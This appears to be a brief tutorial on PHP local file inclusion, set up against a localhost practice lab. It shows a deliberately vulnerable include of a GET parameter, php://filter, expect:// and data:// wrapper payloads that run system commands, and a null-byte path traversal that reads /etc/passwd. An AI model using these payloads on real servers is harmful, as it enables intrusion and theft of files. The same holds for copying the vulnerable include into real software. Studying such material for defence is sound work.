What is local file inclusion?

Local File Inclusion (LFI) allows an attacker to include files on a server through the web browser. This vulnerability exists when a web application includes a file without correctly sanitizing the input, allowing an attacker to manipulate the input and inject path traversal characters and include other files from the webserver.

Identifying vulnerable

http://localhost/webhacking/PHP-LFI/index.php?page=page2.php

    ?page=page2.php this is mean web server include some file on local server

Example code vulnerable

<?php
 if (isset($_GET[‘page’]))
 {
 include $_GET[‘page’];
 }
 else
 {
 echo “<p>This is the front page.</p>”;
 }
?>

Type of PHP wrapper

    expect://ls : allow execution of system commands, btw this command not enable default
    php://input : send payload through post method on PHP

    php://filter : allow the attacker to include local file and base64 encode as the output

php://filter/convert.base64-encode/resource=index.php

PHP filter without base64 encode

php://filter/resource=flag.txt

Note: PHP wrapper can be chained multiple time, example

php://filter/convert.base64-encode|convert.base64-decode/resource=index.php

    data:// : can inject the PHP code you want executing directly into the URL

1. data:text/plain,<?php phpinfo(); ?>
2. data:,<?system($_GET['x']);?>&x=ls
3. data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls

Null byte technique

Note: only in versions of PHP below 5.3.4 we can terminate with a null byte

?page=../../../etc/passwd%00

you can use “?” Instead null byte, this is can manipulate web server with adding get request at the end of the payload